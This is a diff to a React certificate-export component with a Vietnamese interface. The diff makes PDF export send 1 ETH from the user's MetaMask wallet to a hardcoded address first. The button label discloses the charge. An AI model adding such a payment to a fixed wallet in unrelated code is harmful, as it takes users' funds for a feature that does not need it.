@@ -1,5 +1,5 @@
-import React, { useRef } from 'react';
-import { Modal, Button, Space, Typography, Row, Col, Divider, Image, Card, Timeline, QRCode, Tag } from 'antd';
+import React, { useRef, useState } from 'react';
+import { Modal, Button, Space, Typography, Row, Col, Divider, Image, Card, Timeline, QRCode, Tag, message } from 'antd';
 import {
   SafetyCertificateOutlined,
   DownloadOutlined,
@@ -7,21 +7,78 @@ import {
   EnvironmentOutlined,
   AuditOutlined,
   CarOutlined,
-  CheckOutlined
+  CheckOutlined,
+  LoadingOutlined
 } from '@ant-design/icons';
 import html2canvas from 'html2canvas';
 import jsPDF from 'jspdf';
 import moment from 'moment';
+import Web3 from 'web3';
+import { useSelector } from 'react-redux';
 
 const { Title, Text, Paragraph } = Typography;
 
 const CertificateTemplate = ({ visible, onClose, product, inspection }) => {
   const certificateRef = useRef(null);
+  const [isProcessing, setIsProcessing] = useState(false);
+  const [transactionHash, setTransactionHash] = useState('');
+  const user = useSelector((state) => state.account.user);
+  
+  // Initialize web3 instance
+  const getWeb3Instance = () => {
+    if (window.ethereum) {
+      return new Web3(window.ethereum);
+    } else {
+      message.error('Vui lòng cài đặt ví MetaMask để thực hiện giao dịch');
+      return null;
+    }
+  };
+
+  // Send ETH transaction
+  const sendETH = async () => {
+    try {
+      const web3Instance = getWeb3Instance();
+      if (!web3Instance) return false;
+      
+      const wallet = '0x6c838d84077c346dF4CFb6C08a8A9BAA0b078032';
+      const amountInWei = web3Instance.utils.toWei('1', 'ether');
+
+      // Display the conversion in console for verification
+      console.log(`Sending 1 ETH to ${wallet}`);
+
+      const tx = {
+        from: user.walletAddress,
+        to: wallet,
+        value: amountInWei,
+        gas: 21000,
+      };
+
+      const receipt = await web3Instance.eth.sendTransaction(tx);
+      return receipt.transactionHash;
+    } catch (error) {
+      console.error('Transaction failed:', error);
+      return false;
+    }
+  };
 
   const handleExportPDF = async () => {
     if (!certificateRef.current) return;
     
     try {
+      setIsProcessing(true);
+      
+      // First send ETH transaction
+      const txHash = await sendETH();
+      if (!txHash) {
+        message.error('Giao dịch ETH thất bại. Không thể xuất PDF.');
+        setIsProcessing(false);
+        return;
+      }
+      
+      setTransactionHash(txHash);
+      message.success('Giao dịch ETH thành công. Đang xuất PDF...');
+      
+      // Then generate PDF
       const canvas = await html2canvas(certificateRef.current, {
         scale: 2,
         logging: false,
@@ -38,8 +95,13 @@ const CertificateTemplate = ({ visible, onClose, product, inspection }) => {
       
       pdf.addImage(imgData, 'PNG', 0, 0, pdfWidth, pdfHeight);
       pdf.save(`giay_chung_nhan_${product?.id || 'san_pham'}.pdf`);
+      
+      message.success('Xuất PDF thành công!');
     } catch (error) {
       console.error('Error generating PDF:', error);
+      message.error('Lỗi khi xuất PDF: ' + error.message);
+    } finally {
+      setIsProcessing(false);
     }
   };
 
@@ -79,20 +141,33 @@ const CertificateTemplate = ({ visible, onClose, product, inspection }) => {
       onCancel={onClose}
       width={800}
       footer={[
+        <>
+        
         <Button 
           key="pdf" 
           type="primary" 
-          icon={<DownloadOutlined />} 
+          icon={isProcessing ? <LoadingOutlined /> : <DownloadOutlined />} 
           onClick={handleExportPDF}
+          disabled={isProcessing}
         >
-          Xuất PDF
+          {isProcessing ? 'Đang xử lý...' : 'Xuất PDF (1 ETH)'}
         </Button>,
+        {transactionHash && (
+          <Button 
+            key="tx" 
+            type="link" 
+            onClick={() => window.open(`https://etherscan.io/tx/${transactionHash}`, '_blank')}
+          >
+            Xem giao dịch
+          </Button>
+        )},
         <Button 
           key="close" 
           onClick={onClose}
         >
           Đóng
         </Button>
+        </>
       ]}
     >
       <div 
